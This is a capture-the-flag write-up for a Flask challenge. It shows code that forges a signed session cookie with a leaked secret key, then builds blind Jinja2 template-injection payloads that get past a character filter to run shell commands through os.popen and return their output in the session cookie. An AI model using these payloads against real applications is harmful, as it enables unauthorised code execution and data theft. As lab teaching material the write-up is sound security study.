# Moderate Writeup

Takes us straight to a Login page....
We can also find the /debug for the source

## Login Page

 - Doesn't actually do anything
 - EXCEPT if we have the correct cookie we can then get to the main page.
 
## Mangling the cookies

Looks like if we have the Key,  we can mangle the cookie and win.

  - https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce
  - https://chc.cs.cornell.edu/writeups/4/
  - https://ctftime.org/writeup/11812
  
Code for Mangling Cookies is below
We need to install flask

```
def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, serializer=serializer, salt=salt, signer_kwargs = signer_kwargs)
    return s.loads(cookie_str)


def encode_flask_cookie(secret_key, data):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, serializer=serializer, salt=salt, signer_kwargs = signer_kwargs)
    return s.dumps(data)
```

We need the Key (Which is at the top of our page)

And we can get the cookie we need using this code (in the moderateExploit.py)

```
    r = session.get(URL)
    sessionCookie = session.cookies["session"]

    #Lets decode it
    decodeCookie = decode_flask_cookie(SECRET_KEY, sessionCookie)
    
    #Modify the Text
    decodeCookie["user"] = "Balthazar"
    #Recode the Cookie (I think we could skip the whole decode, but lets leave it)
    recodeCookie = encode_flask_cookie(SECRET_KEY, decodeCookie)

    session.cookies["session"] = recodeCookie
    r = session.get(URL)
```


Ok this now takes us back to the same login page as we had in the easy version.
However the logic we have here is different.....

## Getting data: POC

We cant get data in the same way as before.

We also have three problems

### Blind Injection

The line that does the magic is this


```
templateStr = "<div class='alert'>{0}</div>".format(theText)
out = flask.render_template_string(templateStr)
```

Even through its not returned, this is still fed through the renderer, 
so we get code evaluation.  But its blind.

### Filtering 

We also have to deal with input filtering

```
badChars = ["{{","}}","'",'"',"format","socket"]
regex = re.compile('|'.join(map(re.escape, badChars)))
```

### Length issues

Finally, our input cant be more that 150 Chars

```
if len(theText) > 150:
    return "Too Long"
```

## Getting Code Execution

### Bypassing ```{{```

We can still execute code using `{% if ... %}` tags, but we cant ask it to display output 

Lets test this first

```
payload = {"king": "{% if True %} Foo {% endif %}", "name": "dang", "gift": "foo"}
```

We get this through the filter, but it doesn't really help, as we get no output.
So we want to make the thing sleep (as per blind SQL)

Grab the Explit from 

https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

```
request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('sleep 5')['read']() == 'chiv' %} a {% endif %}
```


But we need to work around various parts of the filters.  We can work out if things work by checking for errors

First off lets get rid of the various single quotes that we can switch out easily
```
request.application.__globals__.__builtins__.__import__('os').popen('sleep 5').read()
```

### Bypassing Strings.

Stroke of inspiration allows us to do the same using arguments to add the other strings
```
request.application.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read()
```

Which means our full payload is 

```
#Update the King Element
payload["king"] = "{% if request.application.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read() %} Foo {% endif %}"

#And we also need some paramaers for the strings
params = {"a": "os", "b": "sleep 5"}
```

When we run this it taks 5 seconds to respond...

```
In [54]: r = session.post(URL, data=payload, params=params)
In [56]: r.elapsed.total_seconds()
Out[56]: 5.015917
```

### Exfiltrating the Payload via Cookies

While the payload above works, we could probably do something with sleep.
If we check whats there we have access to the cookies.

Lets see if we can modify the stuff to make that work

```
payload["king"] = "{% if session.update(foo=request.application.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read()) %} Foo {% endif %}"
```

And our output looks like this

```
r = session.post(URL, data=payload, params=params)

tmp = session.cookies.get("session",domain="127.0.0.1")

moderateExploit.decode_flask_cookie("FooBar", tmp)
{'foo': '', 'user': 'Balthazar'}
```


So Now we can use the same approach to exfiltrte the data via the cookie

Setting the payload to ```cat flag.txt``` Fails

```
params = {"a": "os",  "b": "cat flag.txt"}
```

Obviously the dev is evil, and that doesnt exist....

However we can find it with ```ls -l```  then catting ```theFlag.txt```
